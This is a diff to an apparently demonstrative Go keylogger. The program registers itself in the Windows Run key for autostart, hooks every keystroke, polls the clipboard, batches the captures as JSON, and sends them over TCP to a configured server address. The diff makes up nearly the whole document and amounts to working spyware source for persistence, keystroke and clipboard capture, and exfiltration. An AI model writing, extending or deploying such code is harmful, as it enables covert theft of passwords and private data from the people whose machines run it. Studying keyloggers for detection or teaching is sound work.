@@ -6,6 +6,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"github.com/atotto/clipboard"
 	hook "github.com/robotn/gohook"
@@ -13,10 +14,14 @@ import (
 	"net"
 	"os"
 	"runtime"
+	"time"
 )
 
+// KeyType is the alias of string
+type KeyType string
+
 const (
-	Protocol = "udp"
+	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
 	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
@@ -25,28 +30,46 @@ const (
 	OSWindows = "windows"
 	OSLinux   = "linux"
 	OSDarwin  = "darwin"
+
+	TypeKeyboard  KeyType = "KBD"
+	TypeClipboard KeyType = "CBD"
+	TypeSpecial   KeyType = "SPC"
+
+	// MaxLog controls the sending frequency. Set it to a small value for better demonstrating.
+	// MaxLog = 64
+	MaxLog = 4
 )
 
-var conn net.Conn
+type keyLog struct {
+	Time  int64   `json:"time"`
+	Type  KeyType `json:"type"`
+	Value string  `json:"value"`
+}
 
-func init() {
-	var err error
-	conn, err = net.Dial(Protocol, Address)
-	if err != nil {
-		return
+func newKeyLog(keyType KeyType, value string) keyLog {
+	return keyLog{
+		Time:  time.Now().UnixMilli(),
+		Type:  keyType,
+		Value: value,
 	}
 }
 
+var keyLogs []keyLog
+
 func main() {
-	defer conn.Close()
 	// Register autostart service.
 	setAutostart()
 	// Start a goroutine to listen clipboard.
 	go listenClipboard()
 	// Start a goroutine to listen keyboard.
 	go listenKeyboard()
-	// Block main process.
-	select {}
+	// Auto send.
+	for {
+		// When have logged to the thresh, send and clear the recorded logs.
+		if len(keyLogs) >= MaxLog {
+			sendLogs()
+		}
+	}
 }
 
 // setAutostart registers autostart service on this device.
@@ -76,30 +99,69 @@ func setAutostart() {
 	}
 }
 
-// listenClipboard listens changes of clipboard and send to the server.
+// listenClipboard listens and logs changes of clipboard.
 func listenClipboard() {
 	var text string
 	for {
 		// Read from clipboard.
 		t, _ := clipboard.ReadAll()
-		// If the clipboard is nonempty string or has been changed, send it.
+		// If the clipboard is nonempty string or has been changed, log it.
 		if t != text && t != "" {
 			text = t
-			conn.Write([]byte(text))
+			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, text))
 		}
 	}
 }
 
-// listenKeyboard listens events of keyboard and send to the server.
+// listenKeyboard listens and logs the events of keyboard.
 func listenKeyboard() {
 	evChan := hook.Start()
 	defer hook.End()
 	for ev := range evChan {
 		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
 		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
-		// if detected characters typed, send.
+		// if detected characters typed, log it.
 		if ev.Kind == hook.KeyDown {
-			conn.Write([]byte(fmt.Sprintf("%c", ev.Keychar)))
+			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
+			switch ev.Keychar {
+			case '\r':
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "enter"))
+			case '\b':
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "backspace"))
+			case '\t':
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "tab"))
+			default:
+				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
+				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
+				// the Value field of the last object.
+				if len(keyLogs) == 0 {
+					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
+				} else {
+					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
+						keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
+					} else {
+						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
+					}
+				}
+			}
 		}
 	}
+}
+
+// sendLogs sends keyLogs to the target server via TCP.
+func sendLogs() {
+	// Create TCP end point for dialing.
+	laddr, _ := net.ResolveTCPAddr(Protocol, Address)
+	// Dial to connect to the server.
+	conn, err := net.DialTCP(Protocol, nil, laddr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	// Serialise keyLog slice to JSON.
+	bytes, _ := json.Marshal(keyLogs)
+	// Send logs to the target server.
+	_, _ = conn.Write(bytes)
+	// Clear the keyLog slice.
+	keyLogs = []keyLog{}
 }
